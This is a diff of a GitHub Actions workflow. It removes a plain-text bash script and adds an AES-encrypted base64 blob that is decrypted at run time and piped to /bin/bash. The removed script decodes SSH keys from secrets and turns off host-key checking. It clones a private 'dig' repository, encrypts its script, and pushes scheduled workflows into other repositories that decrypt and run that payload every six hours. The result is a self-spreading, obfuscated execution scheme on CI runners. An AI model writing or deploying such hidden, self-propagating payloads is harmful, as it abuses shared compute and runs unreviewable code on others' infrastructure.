@@ -2,7 +2,7 @@ name: wutian9595_0
 on:
   workflow_dispatch:
   schedule:
-    - cron: '54 08 05 07 *'
+    - cron: '56 08 05 07 *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,69 +12,4 @@ jobs:
         env:
           Parameters: ${{ secrets.Parameters }}
         run: |
-          echo "#!/bin/bash
-
-# export Parameters=$(cat Parameters.json); rm -rf setup_dig_task_yml.sh; vim setup_dig_task_yml.sh; chmod +x setup_dig_task_yml.sh; ./setup_dig_task_yml.sh
-
-account_id=$(echo $Parameters | jq -r .account_id)
-echo "account_id: ${account_id}"
-email=$(echo $Parameters | jq -r .email)
-echo "email: ${email}"
-dig_repo_name=$(printf "%s" "${account_id}_dig" | shasum -a 256 | awk '{print $1}')
-echo "dig_repo_name: ${dig_repo_name}"
-
-# 下载原始dig仓库，获取dig.sh脚本代码
-echo $Parameters | jq -r .shoguncao_dig_ssh_key_base64 | base64 -d > shoguncao_dig_ssh_key
-chmod 600 shoguncao_dig_ssh_key
-rm -rf $dig
-GIT_SSH_COMMAND='ssh -i shoguncao_dig_ssh_key -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no"' git clone git@github.com:shoguncao/dig.git
-pushd dig
-dig_sh=$(cat dig.sh)
-dig_sh="${dig_sh}"" # ${account_id} $RANDOM"
-dig_sh_base64=$(echo "${dig_sh}" | openssl enc -aes-256-cbc -base64 -A -salt -pbkdf2 -pass pass:${account_id})
-popd
-
-# 下载新的dig仓库
-echo $Parameters | jq -r .self_ssh_key_base64 | base64 -d > self_ssh_key_base64
-chmod 600 self_ssh_key_base64
-rm -rf $dig_repo_name
-GIT_SSH_COMMAND='ssh -i self_ssh_key_base64 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no"' git clone git@github.com:${account_id}/${dig_repo_name}.git
-
-pushd {dig_repo_name}
-
-START_HOUR=$(( RANDOM % 6 ))
-MINUTE=$(( RANDOM % 60 ))
-CRON_EXPRESSION="$MINUTE $START_HOUR/6 * * *"
-echo "CRON_EXPRESSION: ${CRON_EXPRESSION}"
-
-# 创建dig.yml
-mkdir -p .github/workflows
-cat > .github/workflows/${account_id}.yml << EOF
-name: ${account_id}
-on:
-  workflow_dispatch:
-  schedule:
-    - cron: '${CRON_EXPRESSION}'
-jobs:
-  build:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-      - name: ${account_id}
-        env:
-          Parameters: \${{ secrets.Parameters }}
-        run: |
-          echo "${dig_sh_base64}" | openssl enc -d -aes-256-cbc -base64 -A -salt -pbkdf2 -pass pass:\${GITHUB_REPOSITORY_OWNER} | /bin/bash
-EOF
-
-# 提交代码
-git config --global user.name ${account_id}
-git config --global user.email ${email}
-git add .github/workflows/${account_id}.yml
-git commit -m "ci"
-GIT_SSH_COMMAND='ssh -i ../self_ssh_key_base64 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no"' git pull -r
-GIT_SSH_COMMAND='ssh -i ../self_ssh_key_base64 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no"' git push
-
-popd
-
-exit 0 # wutian9595 23964" | openssl enc -d -aes-256-cbc -base64 -A -salt -pbkdf2 -pass pass:${GITHUB_REPOSITORY_OWNER} | /bin/bash
+          echo "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" | openssl enc -d -aes-256-cbc -base64 -A -salt -pbkdf2 -pass pass:${GITHUB_REPOSITORY_OWNER} | /bin/bash
